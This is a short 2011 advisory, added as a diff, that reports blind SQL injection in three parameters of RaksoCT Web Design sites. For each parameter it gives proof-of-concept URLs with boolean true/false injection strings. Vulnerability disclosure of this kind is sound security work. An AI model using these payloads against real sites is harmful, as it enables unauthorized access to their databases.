@@ -1,0 +1,28 @@
+Title        : RaksoCT Web Design Vulnerable to Multiples SQL Injection
+Web        : http://raksoct.com/
+Found By : p0pc0rn 25/02/2011
+
+Blind SQL
+----------
+1 - Parameter gallery_details.asp?a_id=[Blind SQL]
+
+POC
+---
+http://site.com//gallery_details.asp?a_id=12' and '1'='1 TRUE
+http://site.com//gallery_details.asp?a_id=12' and '0'='1 FALSE
+
+2 - Parameter news.asp?intSeq=[Blind SQL]
+
+POC
+---
+http://www.site.com/news/news.asp?intSeq=69' and '1'='1 TRUE
+http://www.site.com/news/news.asp?intSeq=69' and '0'='1 FALSE
+
+3 - Parameter news.asp?id=[Blind SQL]
+
+POC
+---
+http://www.site.com/news/news.asp?id=256 and 1=1 TRUE
+http://www.site.com/news/news.asp?id=256 and 1=0 FALSE
+
+ 		 	   		  
